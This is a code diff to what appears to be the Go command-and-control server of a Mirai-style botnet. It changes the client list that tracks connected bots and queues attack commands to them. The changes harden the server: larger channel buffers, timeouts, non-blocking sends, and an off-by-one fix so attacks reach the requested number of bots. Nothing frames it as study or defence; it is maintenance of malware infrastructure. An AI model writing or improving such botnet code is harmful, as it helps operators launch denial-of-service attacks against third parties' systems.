@@ -28,10 +28,10 @@ type ClientList struct {
 func NewClientList() *ClientList {
     c := &ClientList{
         0, 0, make(map[int]*Bot), 
-        make(chan *Bot, 128), make(chan *Bot, 128), 
-        make(chan *AttackSend), make(chan int, 64), 
-        make(chan int), make(chan int), make(chan map[string]int),
-        make(chan int), make(chan []*Bot),
+        make(chan *Bot, 1024), make(chan *Bot, 1024), 
+        make(chan *AttackSend, 1024), make(chan int, 1024), 
+        make(chan int, 128), make(chan int, 128), make(chan map[string]int, 128),
+        make(chan int, 128), make(chan []*Bot, 128),
         &sync.Mutex{},
     }
     go c.worker()
@@ -41,17 +41,38 @@ func NewClientList() *ClientList {
 func (this *ClientList) Count() int {
     this.cntMutex.Lock()
     defer this.cntMutex.Unlock()
-    this.cntView <- 0
-    return <-this.cntView
+    select {
+    case this.cntView <- 0:
+        select {
+        case res := <-this.cntView:
+            return res
+        case <-time.After(1 * time.Second):
+            return this.count
+        }
+    default:
+        return this.count
+    }
 }
 func (this *ClientList) Distribution() map[string]int {
     this.cntMutex.Lock()
     defer this.cntMutex.Unlock()
-    this.distViewReq <- 0
-    return <-this.distViewRes
+    select {
+    case this.distViewReq <- 0:
+        select {
+        case res := <-this.distViewRes:
+            return res
+        case <-time.After(1 * time.Second):
+            return make(map[string]int)
+        }
+    default:
+        return make(map[string]int)
+    }
 }
 func (cl *ClientList) AddClient(c *Bot) {
-    cl.addQueue <- c
+    select {
+    case cl.addQueue <- c:
+    default:
+    }
     addr := c.conn.RemoteAddr().String()
     sourceType := c.source
     const (
@@ -68,11 +89,17 @@ func (cl *ClientList) AddClient(c *Bot) {
     )
 }
 func (this *ClientList) DelClient(c *Bot) {
-    this.delQueue <- c
+    select {
+    case this.delQueue <- c:
+    default:
+    }
 }
 func (this *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
     attack := &AttackSend{buf, maxbots, botCata}
-    this.atkQueue <- attack
+    select {
+    case this.atkQueue <- attack:
+    default:
+    }
 }
 func (this *ClientList) fastCountWorker() {
     for {
@@ -81,7 +108,10 @@ func (this *ClientList) fastCountWorker() {
             this.count += delta
             break
         case <-this.cntView:
-            this.cntView <- this.count
+            select {
+            case this.cntView <- this.count:
+            default:
+            }
             break
         }
     }
@@ -104,24 +134,33 @@ func (this *ClientList) worker() {
             if atk.count == -1 {
                 for _,v := range this.clients {
                     if atk.botCata == "" || atk.botCata == v.source {
-                        v.QueueBuf(atk.buf)
+                        select {
+                        case v.writeChan <- atk.buf:
+                        default:
+                        }
                     }
                 }
             } else {
                 var count int
                 for _, v := range this.clients {
-                    if count > atk.count {
+                    if count >= atk.count {
                         break
                     }
                     if atk.botCata == "" || atk.botCata == v.source {
-                        v.QueueBuf(atk.buf)
-                        count++
+                        select {
+                        case v.writeChan <- atk.buf:
+                            count++
+                        default:
+                        }
                     }
                 }
             }
             break
         case <-this.cntView:
-            this.cntView <- this.count
+            select {
+            case this.cntView <- this.count:
+            default:
+            }
             break
         case <-this.distViewReq:
             res := make(map[string]int)
@@ -145,6 +184,15 @@ func (this *ClientList) worker() {
 func (this *ClientList) GetBots() []*Bot {
     this.cntMutex.Lock()
     defer this.cntMutex.Unlock()
-    this.listViewReq <- 0
-    return <-this.listViewRes
+    select {
+    case this.listViewReq <- 0:
+        select {
+        case res := <-this.listViewRes:
+            return res
+        case <-time.After(2 * time.Second):
+            return make([]*Bot, 0)
+        }
+    default:
+        return make([]*Bot, 0)
+    }
 }
